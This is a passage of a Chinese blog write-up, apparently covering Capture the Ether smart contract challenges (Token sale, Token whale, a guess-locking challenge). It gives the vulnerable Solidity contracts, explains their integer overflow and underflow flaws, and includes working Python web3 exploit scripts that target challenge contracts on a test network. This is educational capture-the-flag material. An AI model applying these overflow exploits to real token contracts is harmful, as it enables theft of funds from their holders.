&quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;hash&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bytes32&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;lockInGuess&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[key]&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line">acct = w3.eth.account.from_key(wallet_private_key) </span><br><span class="line"></span><br><span class="line">my_guess_hash = <span class="string">&quot;0000000000000000000000000000000000000000000000000000000000000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(w3.eth.getTransactionCount(acct.address))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(contract.all_functions())</span><br><span class="line"></span><br><span class="line">tx = contract.functions.lockInGuess(my_guess_hash).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="string">&quot;value&quot;</span>:  Web3.toWei(<span class="number">1</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">            <span class="string">&quot;gas&quot;</span>: <span class="number">3000000</span>,</span><br><span class="line">            <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gasPrice,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">            <span class="string">&quot;chainId&quot;</span>: <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">signed = acct.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(w3.eth.wait_for_transaction_receipt(tx_id, timeout=  <span class="number">300</span> ))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="1-Token-sale"><a href="#1-Token-sale" class="headerlink" title="1. Token sale"></a>1. Token sale</h3><p><strong>题目描述：</strong></p><p>This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.</p><p>The contract starts off with a balance of 1 ether. See if you can take some of that away.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN &#x3D; 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] +&#x3D; numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -&#x3D; numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=tgIqecROs5M"><del>Sale</del> Sail</a>.</p><p><strong>解题：</strong></p><p><code>buy</code> 函数中的乘法存在溢出， 因此我们可以低买高卖 。 此处的msg.value是以ether为单位，因为一个PRICE_PRE_TOKEN就是1 ether，这里我们需要明白在以太坊里最小的单位是wei，所以此处的1 ether事实上也就是10^18 wei，即其值的大小为10^18 wei，这样就满足我们溢出的条件了，因为以太坊处理数据是以256位为单位，我们传入一个较大的numTokens，乘法运算溢出后所需的mag.value就非常小了， 直接利用 Python 脚本解决这个题目。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> timeout</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;0x0e27e17Ab06db38134825299a2bA0A3749Ea810c&quot;</span></span><br><span class="line">wallet_addr = <span class="string">&quot;0x5b667caAC1E53411D9b87Fc39eEe2F881FDDF589&quot;</span></span><br><span class="line">wallet_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;balanceOf&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;numTokens&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;buy&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;numTokens&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;sell&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[key]&quot;</span>))</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line">acct = w3.eth.account.from_key(wallet_private_key)</span><br><span class="line"></span><br><span class="line">min_token_number_with_overflow = <span class="number">2</span> ** <span class="number">256</span> // <span class="number">10</span> ** <span class="number">18</span> + <span class="number">1</span></span><br><span class="line">value = (min_token_number_with_overflow * <span class="number">10</span> ** <span class="number">18</span>) % <span class="number">2</span> ** <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Buying ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">tx = contract.functions.buy(min_token_number_with_overflow).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span> : value,</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span>,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">signed = acct.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Bought!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Selling ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tx = contract.functions.sell(<span class="number">1</span>).buildTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span>,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    signed = acct.signTransaction(tx)</span><br><span class="line">    tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">    receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line">    <span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Sold!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(contract.functions.isComplete().call())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Solved&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-Token-whale"><a href="#2-Token-whale" class="headerlink" title="2. Token whale"></a>2. Token whale</h3><p><strong>题目描述：</strong></p><p>This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with.</p><p>Find a way to accumulate at least 1,000,000 tokens to solve this challenge.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name &#x3D; &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol &#x3D; &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals &#x3D; 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player &#x3D; _player;</span><br><span class="line">        totalSupply &#x3D; 1000;</span><br><span class="line">        balanceOf[player] &#x3D; 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;&#x3D; 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line">        require(balanceOf[to] + value &gt;&#x3D; balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] &#x3D; value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;&#x3D; value);</span><br><span class="line">        require(balanceOf[to] + value &gt;&#x3D; balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -&#x3D; value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=cvcA8truev4">Tough Decisions</a>.</p><p><strong>解题：</strong></p><p>初始账户有 1000 个token， 题目要求我们获取到 1000000 token 。 主要交易函数有两个: <code>transfer</code>  以及<code>transferFrom</code> , 这两个函数最后都调用了 <code>_transfer</code>  。通过简单审计我们发现， <code>_transfer</code>  中的 <code>balanceOf[msg.sender] -= value;</code>  是存在溢出的 。 另外我们注意到 <code>transferFrom</code> 进行了大小检， 但是检查的是 <code>balanceOf[from] &gt;= value</code> , 但实际扣款的是  msg.sender , 因此此处存在漏洞风险。</p><p>利用思路：</p><ol><li>准备需要两个账户 （通过 metamask 新建一个账户即可 ）</li><li>通过 <code>transfer</code>  向新建的账户转 balance， 多转点， 让新账户的 balance 多于主账户的即可</li><li>调用 <code>approve</code>  设置 <code>allowance</code> ,  <code>spender</code> 为主账户，<code>value</code> 为大于后面要转的值即可 ，例如设置为 1000</li><li>最后调用 <code>transferFrom</code> 函数 <code>from</code>  设置为账号 2， <code>to</code>  设置为非主账户即可， 转入一个值让其溢出即可。 </li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span 